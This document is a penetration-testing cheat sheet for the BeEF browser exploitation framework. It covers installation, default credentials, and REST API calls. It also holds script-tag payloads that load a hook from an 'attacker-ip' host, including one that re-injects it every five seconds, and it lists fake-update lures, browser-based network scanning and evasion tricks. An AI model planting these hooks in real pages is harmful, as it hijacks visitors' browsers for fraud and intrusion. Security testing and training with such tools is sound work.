# BeEF - Browser Exploitation Framework

Penetration testing tool focusing on web browser exploitation and client-side attacks.

## Installation

```bash
# Ubuntu/Debian
apt install beef-xss

# From source
git clone https://github.com/beefproject/beef.git
cd beef
bundle install
```

## Starting BeEF

```bash
# Start BeEF server
./beef

# Access web interface
http://127.0.0.1:3000/ui/panel
# Default credentials: beef:beef
```

## Hook Integration

### Basic Hook
```html
<script src="http://attacker-ip:3000/hook.js"></script>
```

### Persistent Hook
```html
<script>
setInterval(function(){
  var script = document.createElement('script');
  script.src = 'http://attacker-ip:3000/hook.js';
  document.head.appendChild(script);
}, 5000);
</script>
```

### Social Engineering Hooks
- Fake login forms
- Software update notifications
- Security warning popups
- Fake error messages

## Command Modules

### Information Gathering
```bash
# Browser fingerprinting
- Detect browser version
- Plugin enumeration
- System information
- Network details
```

### Social Engineering
```bash
# Fake notifications
- Adobe Flash update
- Java update required
- Security certificate warning
- Browser out of date
```

### Network Discovery
```bash
# Internal network scanning
- Port scanning through browser
- Service enumeration
- Network topology mapping
- Router exploitation
```

### Persistence
```bash
# Maintain access
- Browser autopwn
- Persistent hooks
- Cross-site scripting
- Man-in-the-browser attacks
```

## Advanced Attacks

### Tunneling Proxy
Route traffic through hooked browsers for internal network access.

### DNS Tunneling
Bypass network restrictions using DNS queries.

### WebRTC Attacks
Exploit WebRTC for IP address disclosure and direct connections.

### Browser Autopwn
Automated exploitation of browser vulnerabilities.

## REST API

```bash
# Hook status
GET /api/hooks

# Execute module
POST /api/modules/{module_id}/command

# Results retrieval
GET /api/logs
```

## Evasion Techniques

### Obfuscation
- JavaScript code obfuscation
- Dynamic payload generation
- Anti-detection measures

### Domain Fronting
- CDN-based delivery
- Legitimate domain abuse
- Traffic masking

Educational tool for understanding client-side attack vectors and browser security.
